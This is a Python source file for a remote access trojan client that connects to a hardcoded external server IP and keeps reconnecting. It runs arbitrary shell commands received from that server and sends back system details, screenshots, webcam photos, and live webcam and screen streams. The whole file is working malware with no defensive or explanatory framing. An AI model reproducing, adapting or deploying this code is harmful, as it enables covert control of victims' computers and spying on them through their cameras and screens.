import socket
import struct
import json
import subprocess
import os
import platform
import time
import base64
import threading

# Optional dependencies
try:
    import pyautogui
except ImportError:
    pyautogui = None

try:
    import cv2
except ImportError:
    cv2 = None

# Configuration
# HOST = '127.0.0.1' # Localhost for testing
HOST = '170.64.186.179' # Server IP
PORT = 6000

class RATClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.streaming = False
        self.monitor_streaming = False
        self.send_lock = threading.Lock()

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                print(f"[*] Connected to server {self.host}:{self.port}")
                self.handle_server()
            except Exception as e:
                print(f"[!] Connection failed: {e}")
                time.sleep(5)  # Retry every 5 seconds

    def send_json(self, data):
        with self.send_lock:
            try:
                resp_bytes = json.dumps(data).encode('utf-8')
                resp_length = struct.pack('!I', len(resp_bytes))
                self.sock.sendall(resp_length + resp_bytes)
            except Exception as e:
                print(f"[!] Send error: {e}")

    def handle_server(self):
        while True:
            try:
                # Receive payload length
                header = self.recv_all(self.sock, 4)
                if not header:
                    break
                length = struct.unpack('!I', header)[0]
                
                # Receive payload
                data = self.recv_all(self.sock, length)
                if not data:
                    break
                
                command = json.loads(data.decode('utf-8'))
                
                # Process command (might start threads)
                response = self.process_command(command)
                
                # Send immediate response if exists (some cmds might connect async)
                if response:
                    self.send_json(response)
                
            except Exception as e:
                print(f"[!] Error handling server: {e}")
                break
        
        self.streaming = False
        self.sock.close()

    def recv_all(self, sock, size):
        data = b''
        while len(data) < size:
            chunk = sock.recv(size - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def stream_loop(self):
        if not cv2:
            self.send_json({'error': 'CV2 not installed, cannot stream.'})
            self.streaming = False
            return

        cap = cv2.VideoCapture(0)
        # Low resolution for speed
        cap.set(3, 320)
        cap.set(4, 240)
        
        while self.streaming:
            try:
                ret, frame = cap.read()
                if ret:
                    # Compress to JPEG at lower quality
                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 50]
                    _, buffer = cv2.imencode('.jpg', frame, encode_param)
                    b64_string = base64.b64encode(buffer).decode('utf-8')
                    
                    self.send_json({
                        'type': 'stream_frame', 
                        'image_b64': b64_string
                    })
                    time.sleep(0.1) # Max 10 fps
                else:
                    self.send_json({'error': 'Camera read failed'})
                    break
            except Exception as e:
                print(f"Stream error: {e}")
                break
                
        cap.release()

    def process_command(self, cmd_obj):
        cmd_type = cmd_obj.get('type')
        
        if cmd_type == 'shell':
            cmd = cmd_obj.get('command')
            try:
                # Run command
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                return {'output': output.decode('utf-8', errors='replace')}
            except subprocess.CalledProcessError as e:
                return {'output': e.output.decode('utf-8', errors='replace')}
            except Exception as e:
                return {'error': str(e)}
                
        elif cmd_type == 'info':
            info = f"System: {platform.system()} {platform.release()}\n"
            info += f"Machine: {platform.machine()}\n"
            info += f"User: {os.getlogin()}"
            return {'output': info}
            
        elif cmd_type == 'screenshot':
            if pyautogui:
                try:
                    # Capture screenshot to memory
                    screenshot = pyautogui.screenshot()
                    # Convert to bytes
                    import io
                    img_byte_arr = io.BytesIO()
                    screenshot.save(img_byte_arr, format='JPEG', quality=50) # Optimize
                    img_bytes = img_byte_arr.getvalue()
                    
                    # Encode Base64
                    b64_string = base64.b64encode(img_bytes).decode('utf-8')
                    return {'output': 'Screenshot taken.', 'image_b64': b64_string}
                except Exception as e:
                    return {'error': f"Screenshot failed: {e}"}
            else:
                return {'error': "pyautogui not installed on client."}

        elif cmd_type == 'camera':
            # Single shot
            if cv2:
                try:
                    cap = cv2.VideoCapture(0)
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
                        # Encode frame to JPEG
                        _, buffer = cv2.imencode('.jpg', frame)
                        b64_string = base64.b64encode(buffer).decode('utf-8')
                        return {'output': 'Camera captured.', 'image_b64': b64_string}
                    else:
                        return {'error': 'Failed to capture frame from camera.'}
                except Exception as e:
                    return {'error': f"Camera failed: {e}"}
            else:
                return {'error': "cv2 (opencv-python) not installed on client."}
        
        elif cmd_type == 'stream':
            action = cmd_obj.get('action')
            if action == 'start':
                if not self.streaming:
                    self.streaming = True
                    threading.Thread(target=self.stream_loop, daemon=True).start()
                    return {'output': 'Stream started'}
                else:
                    return {'output': 'Stream already running'}
            elif action == 'stop':
                self.streaming = False
                return {'output': 'Stream stopped'}
                
        elif cmd_type == 'monitor':
            action = cmd_obj.get('action')
            if action == 'start':
                if not self.monitor_streaming:
                    self.monitor_streaming = True
                    threading.Thread(target=self.monitor_loop, daemon=True).start()
                    return {'output': 'Screen Monitor started'}
                else:
                    return {'output': 'Screen Monitor already running'}
            elif action == 'stop':
                self.monitor_streaming = False
                return {'output': 'Screen Monitor stopped'}
                
        return {'error': "Unknown command"}
        
    def monitor_loop(self):
        if not pyautogui:
            self.send_json({'error': 'PyAutoGUI not installed, cannot monitor screen.'})
            self.monitor_streaming = False
            return
            
        while self.monitor_streaming:
            try:
                # Capture screenshot
                screenshot = pyautogui.screenshot()
                # Determine scale (e.g. 50% size for speed)
                # For simplicity, send full or resize. Resizing requires PIL (screenshot is PIL obj)
                # Resize to max width 800 (preserve aspect ratio)
                w, h = screenshot.size
                if w > 800:
                    ratio = 800.0 / w
                    new_size = (800, int(h * ratio))
                    screenshot = screenshot.resize(new_size)
                
                import io
                img_byte_arr = io.BytesIO()
                # JPEG with lower quality
                screenshot.save(img_byte_arr, format='JPEG', quality=60) 
                b64_string = base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
                
                self.send_json({
                    'type': 'screen_frame', 
                    'image_b64': b64_string
                })
                # FPS limiter
                time.sleep(0.5) # 2 FPS limit for screen to avoid network congestion
            except Exception as e:
                print(f"Monitor error: {e}")
                break

if __name__ == "__main__":
    client = RATClient(HOST, PORT)
    client.connect()
